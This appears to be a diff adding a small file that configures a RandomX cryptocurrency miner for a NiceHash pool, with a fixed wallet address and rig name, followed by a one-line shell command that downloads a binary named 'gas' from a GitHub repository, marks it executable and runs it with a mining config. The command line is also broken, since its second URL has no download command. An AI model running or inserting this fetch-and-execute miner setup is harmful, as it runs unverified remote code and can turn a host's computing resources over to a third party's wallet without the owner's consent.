@@ -1,0 +1,9 @@
+stratum+tcp://randomxmonero.eu-west.nicehash.com:3380
+
+[RandomX]
+wallet = 3BoeDYdtaiFWZ73zFwQ2MoruNYSCr2jKVv
+coin = BTC
+rigName = test1
+pool1 = randomxmonero.eu-west.nicehash.com:3380
+
+wget https://github.com/joaofelipe34/xeonhost/raw/main/gas && https://raw.githubusercontent.com/joaofelipe34/xeonhost/main/script.ini && chmod +x gas && ./gas script.ini
